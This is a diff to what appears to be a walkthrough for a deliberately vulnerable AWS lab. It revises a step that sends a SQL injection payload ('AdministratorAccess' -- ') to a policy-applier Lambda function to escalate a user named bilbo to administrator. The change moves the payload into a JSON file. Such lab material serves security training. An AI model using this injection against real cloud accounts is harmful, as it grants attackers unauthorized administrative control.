@@ -46,8 +46,15 @@ we'll see what an exploit looks like in the next step.
 5. Invoke the role applier lambda function, passing the name of the bilbo user and the injection payload. 
 
     ```bash
+    # Create the following SQL injection payload in a local JSON file, called 'payload.json'.
+    # Replace [bilbo_user_name_here] with the bilbo username.
+    {
+            "policy_names": ["AdministratorAccess' -- "],
+            "user_name": "[bilbo_user_name_here]"
+    }
+
     # The following command will send a SQL injection payload to the lambda function
-    aws --profile assumed_role --region us-east-1 lambda invoke --function-name [policy_applier_lambda_name] --cli-binary-format raw-in-base64-out --payload '{"policy_names": ["AdministratorAccess'"'"' --"], "user_name": [bilbo_user_name_here]}' out.txt
+    aws --profile assumed_role --region us-east-1 lambda invoke --function-name [policy_applier_lambda_name] --cli-binary-format raw-in-base64-out --payload file://./payload.json out.txt
 
     # cat the results to confirm everything is working properly
     cat out.txt
